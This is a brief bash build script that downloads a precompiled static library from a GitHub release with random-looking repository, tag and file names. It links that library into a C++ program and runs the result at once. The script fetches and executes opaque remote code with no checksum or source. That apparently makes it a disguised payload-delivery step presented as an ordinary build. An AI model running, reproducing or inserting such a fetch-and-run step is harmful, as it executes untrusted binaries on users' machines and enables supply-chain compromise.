#!/usr/bin/env bash
set -e
REPO="xghuiguixiang/pyislandwrench"
TAG="calm-ember-crimson-canyon"
LIB="granite-swell.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget -O "$LIB" -q --timeout=15 --tries=3 "$URL"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
